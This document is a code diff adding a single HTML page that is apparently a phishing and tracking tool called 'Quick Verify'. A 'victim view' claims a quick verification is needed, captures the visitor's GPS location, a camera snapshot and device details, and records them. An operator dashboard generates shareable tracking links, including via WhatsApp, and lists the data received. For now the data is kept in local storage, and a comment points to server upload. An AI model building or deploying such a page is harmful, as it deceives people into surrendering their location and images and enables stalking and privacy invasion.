@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Quick Verify</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+body { background:#f5f5f7; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:16px; }
+.card { background:#fff; border-radius:24px; padding:32px 24px; width:100%; max-width:380px; box-shadow:0 20px 60px rgba(0,0,0,.08); text-align:center; }
+.icon { width:72px; height:72px; margin:0 auto 20px; background:linear-gradient(135deg,#007aff,#5856d6); border-radius:20px; display:flex; align-items:center; justify-content:center; }
+.icon svg { width:36px; height:36px; fill:#fff; }
+h1 { font-size:20px; font-weight:600; color:#1d1d1f; margin-bottom:8px; }
+p.sub { font-size:14px; color:#6e6e73; line-height:1.5; margin-bottom:24px; }
+.btn { display:inline-block; width:100%; padding:16px; border:none; border-radius:14px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
+.btn-primary { background:#007aff; color:#fff; }
+.btn-primary:active { transform:scale(.98); }
+.btn-ghost { background:transparent; color:#007aff; margin-top:12px; }
+.status { margin-top:20px; font-size:13px; color:#6e6e73; min-height:20px; }
+.spinner { display:inline-block; width:16px; height:16px; border:2px solid #ddd; border-top-color:#007aff; border-radius:50%; animation:spin .8s linear infinite; vertical-align:middle; margin-right:8px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+/* Dashboard */
+.dash { max-width:600px; }
+.dash h1 { font-size:24px; margin-bottom:20px; }
+.input-row { display:flex; gap:8px; margin-bottom:24px; }
+.input-row input { flex:1; padding:12px 16px; border:1px solid #d2d2d7; border-radius:12px; font-size:14px; }
+.link-box { background:#f5f5f7; border-radius:12px; padding:16px; margin-bottom:24px; word-break:break-all; font-size:13px; color:#1d1d1f; }
+.link-label { font-size:12px; color:#6e6e73; margin-bottom:8px; text-transform:uppercase; letter-spacing:.5px; }
+.results { text-align:left; }
+.result-item { display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #f0f0f2; font-size:14px; }
+.result-item:last-child { border-bottom:none; }
+.result-key { color:#6e6e73; }
+.result-val { color:#1d1d1f; max-width:60%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.empty { text-align:center; padding:40px 0; color:#6e6e73; font-size:14px; }
+.tab-bar { display:flex; gap:4px; margin-bottom:20px; }
+.tab { flex:1; padding:10px; border:none; border-radius:10px; font-size:13px; font-weight:500; cursor:pointer; background:#f5f5f7; color:#6e6e73; }
+.tab.active { background:#007aff; color:#fff; }
+</style>
+</head>
+<body>
+
+<!-- VICTIM VIEW -->
+<div id="victim-view" class="card">
+  <div class="icon">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+  </div>
+  <h1>Quick Verify</h1>
+  <p class="sub">We need temporary access to your camera and location to complete verification. This takes less than 10 seconds.</p>
+  <button class="btn btn-primary" onclick="startVerify()">Allow Access</button>
+  <button class="btn btn-ghost" onclick="showToast('Link shared via WhatsApp')">Share via WhatsApp</button>
+  <div class="status" id="status"></div>
+</div>
+
+<!-- DASHBOARD VIEW (hidden by default) -->
+<div id="dash-view" class="card dash" style="display:none;">
+  <h1>📊 Received Data</h1>
+  <div class="tab-bar">
+    <button class="tab active" onclick="switchTab(0)">Overview</button>
+    <button class="tab" onclick="switchTab(1)">Location</button>
+    <button class="tab" onclick="switchTab(2)">Media</button>
+    <button class="tab" onclick="switchTab(3)">Device</button>
+  </div>
+  <div class="input-row">
+    <input type="text" id="filter-input" placeholder="Filter entries..." oninput="filterResults()">
+    <button class="btn btn-primary" style="padding:12px 16px; width:auto;" onclick="clearAll()">Clear All</button>
+  </div>
+  <div class="link-box" id="current-link-box">
+    <div class="link-label">Active Link</div>
+    <span id="active-link-text">No active link — generate one below</span>
+  </div>
+  <div class="input-row">
+    <input type="text" id="new-link-id" placeholder="Optional custom ID (e.g., ali-2026)" maxlength="20">
+    <button class="btn btn-primary" style="padding:12px 16px; width:auto;" onclick="generateLink()">Generate Link</button>
+  </div>
+  <div class="results" id="results-container">
+    <div class="empty">No data received yet. Share a link and wait for responses.</div>
+  </div>
+</div>
+
+<script>
+// ==================== STATE ====================
+let store = {
+  links: {},      // id -> { url, createdAt }
+  data: []         // array of received records
+};
+
+const STORAGE_KEY = 'acme_hack_store_v1';
+
+function save() {
+  try { localStorage.setItem(STORAGE_KEY, JSON.stringify(store)); } catch(e){}
+}
+function load() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (raw) store = JSON.parse(raw);
+  } catch(e){}
+}
+
+// ==================== ROUTING ====================
+// Use ?view=dash or ?view=victim&link=XYZ
+const params = new URLSearchParams(window.location.search);
+const view = params.get('view') || 'victim';
+const linkId = params.get('link') || null;
+
+function init() {
+  load();
+  if (view === 'dash') {
+    showDashboard();
+  } else {
+    showVictim(linkId);
+  }
+  renderDashboard();
+}
+
+function showVictim(id) {
+  document.getElementById('victim-view').style.display = 'block';
+  document.getElementById('dash-view').style.display = 'none';
+  if (id && !store.links[id]) {
+    showToast(`Unknown link: ${id}`);
+  }
+}
+
+function showDashboard() {
+  document.getElementById('victim-view').style.display = 'none';
+  document.getElementById('dash-view').style.display = 'block';
+}
+
+// ==================== VICTIM LOGIC ====================
+async function startVerify() {
+  const status = document.getElementById('status');
+  const btn = document.querySelector('.btn-primary');
+  btn.disabled = true;
+  
+  // 1. Get Location
+  status.innerHTML = '<span class="spinner"></span>Getting location...';
+  const loc = await new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }),
+      () => resolve(null)
+    );
+    setTimeout(() => resolve(null), 5000); // timeout
+  });
+
+  // 2. Get Camera
+  status.innerHTML = '<span class="spinner"></span>Accessing camera...';
+  let videoUrl = null;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    
+    // Capture frame
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    videoUrl = canvas.toDataURL('image/jpeg', 0.7);
+    
+    // Stop tracks
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    console.log('Cam denied', e);
+  }
+
+  // 3. Get Device Info
+  const device = getDeviceInfo();
+
+  // 4. Send Data
+  status.innerHTML = '<span class="spinner"></span>Sending data...';
+  const record = {
+    id: Date.now(),
+    linkId: linkId,
+    timestamp: new Date().toISOString(),
+    location: loc,
+    videoThumb: videoUrl, // In real app, upload to S3
+    device: device
+  };
+
+  // Simulate network delay
+  await new Promise(r => setTimeout(r, 800));
+
+  // Save locally (simulating server)
+  store.data.push(record);
+  save();
+
+  status.innerHTML = '✅ Success! You may close this window.';
+  btn.textContent = 'Verified';
+  
+  // Auto redirect to dashboard after 3s for demo purposes
+  setTimeout(() => {
+    window.location.href = '?view=dash';
+  }, 3000);
+}
+
+function getDeviceInfo() {
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    online: navigator.onLine,
+    battery: navigator.battery ? navigator.battery.level : null
+  };
+}
+
+// ==================== DASHBOARD LOGIC ====================
+function renderDashboard() {
+  const container = document.getElementById('results-container');
+  if (!store.data.length) {
+    container.innerHTML = '<div class="empty">No data received yet...</div>';
+    return;
+  }
+  
+  // Sort newest first
+  const sorted = [...store.data].sort((a,b) => b.id - a.id);
+  
+  container.innerHTML = sorted.map(item => `
+    <div class="result-item" data-id="${item.id}">
+      <div>
+        <strong>${formatDate(item.timestamp)}</strong><br>
+        <small>Link: ${item.linkId || 'N/A'}</small>
+      </div>
+      <div class="result-val">
+        ${item.location ? `${item.location.lat.toFixed(4)}, ${item.location.lng.toFixed(4)}` : 'No Loc'}
+        | ${item.device?.language || 'N/A'}
+      </div>
+    </div>
+  `).join('');
+  
+  // Update active link display
+  const activeLink = Object.keys(store.links)[0];
+  if (activeLink) {
+    document.getElementById('active-link-text').textContent = 
+      `${window.location.origin}${window.location.pathname}?view=victim&link=${activeLink}`;
+  }
+}
+
+function generateLink() {
+  const customId = document.getElementById('new-link-id').value.trim();
+  const id = customId || Math.random().toString(36).substr(2, 8);
+  
+  store.links[id] = {
+    url: `${window.location.origin}${window.location.pathname}?view=victim&link=${id}`,
+    createdAt: Date.now()
+  };
+  
+  save();
+  renderDashboard();
+  
+  // Copy to clipboard
+  navigator.clipboard.writeText(store.links[id].url).then(() => {
+    showToast('Link copied to clipboard!');
+  }).catch(() => {
+    prompt('Copy this link:', store.links[id].url);
+  });
+  
+  document.getElementById('new-link-id').value = '';
+}
+
+function clearAll() {
+  if (!confirm('Clear all received data?')) return;
+  store.data = [];
+  save();
+  renderDashboard();
+}
+
+function filterResults() {
+  const term = document.getElementById('filter-input').value.toLowerCase();
+  document.querySelectorAll('.result-item').forEach(el => {
+    el.style.display = el.textContent.toLowerCase().includes(term) ? 'flex' : 'none';
+  });
+}
+
+function switchTab(idx) {
+  document.querySelectorAll('.tab').forEach((t,i) => {
+    t.classList.toggle('active', i === idx);
+  });
+  // In full version, this would filter the results view
+}
+
+// ==================== UTILS ====================
+function formatDate(iso) {
+  const d = new Date(iso);
+  return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+}
+
+function showToast(msg) {
+  const s = document.getElementById('status');
+  if (s) {
+    s.textContent = msg;
+    setTimeout(() => s.textContent = '', 3000);
+  } else {
+    alert(msg);
+  }
+}
+
+// Init on load
+window.addEventListener('load', init);
+</script>
+</body>
+</html>
